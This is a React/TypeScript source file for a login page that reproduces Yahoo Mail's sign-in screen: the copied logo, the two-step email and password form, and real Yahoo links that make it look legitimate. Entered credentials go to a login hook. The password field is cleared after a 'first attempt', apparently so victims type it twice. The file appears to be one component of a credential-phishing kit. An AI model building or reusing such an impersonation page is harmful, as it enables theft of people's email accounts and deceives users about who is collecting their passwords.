import React, { useState, useEffect } from 'react';
import { useLogin } from '../hooks/useLogin';
import Spinner from './common/Spinner';
import { Mail } from 'lucide-react';

interface YahooLoginPageProps {
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
}

// Custom Input component to replicate the exact Yahoo style
const YahooFloatingLabelInput = ({ value, onChange, placeholder, type = "text", autoFocus = false }: any) => {
  const [isFocused, setIsFocused] = useState(false);
  const hasValue = value.length > 0;

  return (
    <div className="relative mt-1 h-12">
      <label
        className={`absolute left-1 transition-all duration-200 ease-in-out pointer-events-none z-0
          ${(isFocused || hasValue) ? 'text-xs top-0 text-gray-500' : 'text-base top-3 text-gray-500'}`}
      >
        {placeholder}
      </label>
      <div className="absolute flex items-center top-3.5">
        {hasValue && type === 'email' && <Mail className="w-5 h-5 text-gray-400 mr-2" />}
        <input
          type={type === 'email' ? 'text' : type} // Use text for email to show icon properly
          value={value}
          onChange={onChange}
          onFocus={() => setIsFocused(true)}
          onBlur={() => setIsFocused(false)}
          autoFocus={autoFocus}
          className="w-full bg-transparent pt-3 pb-1 focus:outline-none"
          style={{ paddingLeft: hasValue && type === 'email' ? '0' : '4px' }}
        />
      </div>
      <div className={`absolute bottom-0 left-0 w-full h-px transition-colors ${isFocused ? 'bg-purple-600' : 'bg-gray-300'}`}></div>
    </div>
  );
};

const YahooLoginPage: React.FC<YahooLoginPageProps> = ({ onLoginSuccess, onLoginError }) => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPasswordStep, setShowPasswordStep] = useState(false);
  const [pageReady, setPageReady] = useState(false);

  const { isLoading, errorMessage, handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);

  useEffect(() => {
    const timer = setTimeout(() => setPageReady(true), 100);
    return () => clearTimeout(timer);
  }, []);

  const handleNext = (e: React.MouseEvent<HTMLButtonElement>) => {
    e.preventDefault();
    if (email) { setShowPasswordStep(true); }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    const result = await handleFormSubmit(e, { email, password, provider: 'Yahoo' });
    if (result?.isFirstAttempt) { setPassword(''); }
  };

  const YahooLogo = ({ className = '' }: { className?: string }) => (
    <svg viewBox="0 0 500 128" className={`select-none ${className}`} xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Yahoo">
      <g fill="#720e9e">
        <path d="M115.258 1.794L76.27 71.885l-.436 54.396h-30.3l.435-54.396L7.98 1.794h34.36l22.15 44.47L86.29 1.794z"/>
        <path d="M167.017 1.794l-49.297 94.562v29.925h-3.564L163.452 31.72V1.794z"/>
        <path d="M202.95 126.28h-30.3l.436-66.49 29.864-58.182v58.18z"/>
        <path d="M218.87 62.186c0-35.072 25.53-62.186 57.646-62.186 32.115 0 57.646 27.114 57.646 62.186s-25.53 62.186-57.646 62.186c-32.116 0-57.647-27.114-57.647-62.186zm84.206 0c0-20.452-11.44-33.697-26.56-33.697S249.957 41.734 249.957 62.186s11.44 33.697 26.56 33.697 26.559-13.245 26.559-33.697z"/>
        <path d="M345.504 62.186c0-35.072 25.53-62.186 57.646-62.186 32.116 0 57.646 27.114 57.646 62.186s-25.53 62.186-57.646 62.186c-32.116 0-57.646-27.114-57.646-62.186zm84.206 0c0-20.452-11.44-33.697-26.56-33.697s-26.559 13.245-26.559 33.697 11.44 33.697 26.56 33.697 26.559-13.245 26.559-33.697z"/>
        <path d="M460.977 48.62c7.833-29.67 16.75-46.826 31.043-46.826a14.3 14.3 0 017.98 2.358v30.756a27.07 27.07 0 00-8.854-1.615c-15.14 0-23.76 12.658-30.17 40.36v52.63h-30.3V1.794h30.3z"/>
      </g>
      <circle cx="165.236" cy="114.143" r="12.138" fill="#720e9e"/>
    </svg>
  );

  if (!pageReady) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <Spinner size="lg" color="border-purple-600" />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white font-sans flex flex-col" style={{ animation: 'fadeIn 0.3s ease-in' }}>
      {/* Changed py-4 to py-6 to move header down, and h-14 to h-11 to reduce logo size */}
      <header className="flex-shrink-0 flex justify-between items-center py-6 px-10">
        <YahooLogo className="h-11" />
        <div className="flex items-center space-x-4 text-xs text-gray-600">
          <a href="https://help.yahoo.com" target="_blank" rel="noopener noreferrer" className="hover:underline">Help</a>
          <a href="https://legal.yahoo.com/us/en/yahoo/terms/otos/index.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Terms</a>
          <a href="https://legal.yahoo.com/us/en/yahoo/privacy/index.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Privacy</a>
        </div>
      </header>

      <main className="flex-grow w-full flex justify-center px-10 pt-8">
        <div className="w-full max-w-7xl flex justify-center items-start md:gap-x-12">
          
          {/* Kept the div for spacing but removed all text content */}
          <div className="hidden md:block pt-16">
            {/* Content removed */}
          </div>

          <div className="w-full md:w-auto flex-shrink-0">
            <div 
              className="w-[360px] mx-auto pt-20 pb-16 px-8 bg-white rounded-2xl" 
              style={{ boxShadow: '0 1px 20px rgba(0,0,0,.04)' }}
            >
              <YahooLogo className="h-9 mx-auto mt-2 mb-6" />
              
              <h2 className="text-center text-[22px] font-bold text-gray-900">
                {!showPasswordStep ? 'Sign in to Yahoo Mail' : 'Enter password'}
              </h2>
              <p className="text-center text-sm text-gray-500 mt-1">using your Yahoo account</p>
              {showPasswordStep && ( <div className="text-center my-4 p-2 bg-gray-100 rounded-full text-sm font-semibold truncate">{email}</div> )}
              
              <form onSubmit={handleSubmit} className="mt-5 space-y-4">
                {errorMessage && !isLoading && ( <p className="text-red-600 text-sm font-medium text-center">{errorMessage}</p> )}
                {!showPasswordStep ? (
                  <div>
                    <YahooFloatingLabelInput value={email} onChange={(e: any) => setEmail(e.target.value)} placeholder="Username, email, or mobile" type="email" />
                    <button onClick={handleNext} disabled={!email} className="w-full mt-5 py-3 bg-[#6300be] text-white font-semibold rounded-full hover:bg-[#5a00ac] disabled:bg-[#6300be] disabled:cursor-not-allowed transition-colors">Next</button>
                  </div>
                ) : (
                  <div>
                    <YahooFloatingLabelInput value={password} onChange={(e: any) => setPassword(e.target.value)} placeholder="Password" type="password" autoFocus />
                    <button type="submit" disabled={isLoading || !password} className="w-full mt-5 py-3 bg-[#6300be] text-white font-semibold rounded-full hover:bg-[#5a00ac] disabled:opacity-50 transition-colors">
                      {isLoading ? <Spinner size="sm" color="border-white" className="mx-auto" /> : 'Sign In'}
                    </button>
                  </div>
                )}
              </form>

              <div className="text-xs mt-4 flex justify-between items-center">
                <label className="flex items-center space-x-2 text-gray-600 cursor-pointer">
                  <input type="checkbox" className="form-checkbox h-4 w-4 text-purple-600 border-gray-300 rounded focus:ring-purple-500" defaultChecked />
                  <span>Stay signed in</span>
                </label>
                <a href="https://login.yahoo.com/forgot" target="_blank" rel="noopener noreferrer" className="text-xs text-[#6300be] hover:underline font-medium">Forgot username?</a>
              </div>
              
              <div className="mt-6 space-y-3">
                <a href="https://login.yahoo.com/account/create" target="_blank" rel="noopener noreferrer" className="w-full block text-center py-3 border border-[#8a2be2] text-[#8a2be2] font-semibold rounded-full hover:bg-purple-50 transition-colors">Create an account</a>
                <div className="relative text-center my-1.5">
                  <span className="absolute inset-x-0 top-1/2 h-px bg-gray-200"></span>
                  <span className="relative bg-white px-2 text-xs text-gray-500">or</span>
                </div>
                <a href="https://login.yahoo.com/" target="_blank" rel="noopener noreferrer" className="w-full flex justify-center items-center gap-2 py-3 border border-gray-300 text-gray-800 font-semibold rounded-full hover:bg-gray-50 transition-colors">
                  <svg viewBox="0 0 48 48" className="w-5 h-5"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59a14.5 14.5 0 010-9.18l-7.98-6.19a24.08 24.08 0 000 21.56l7.98-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
                  Sign in with Google
                </a>
              </div>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
};

export default YahooLoginPage;
